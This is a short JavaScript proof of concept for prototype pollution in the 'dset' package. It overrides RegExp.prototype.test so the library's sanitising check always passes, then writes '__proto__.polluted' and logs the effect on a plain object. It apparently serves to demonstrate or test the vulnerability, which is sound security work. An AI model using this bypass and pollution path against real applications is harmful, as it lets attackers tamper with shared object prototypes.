RegExp.prototype.test = () => true;
console.log({}.polluted);
const dset = require('dset');
dset({}, '__proto__.polluted', 'yes');
console.log({}.polluted);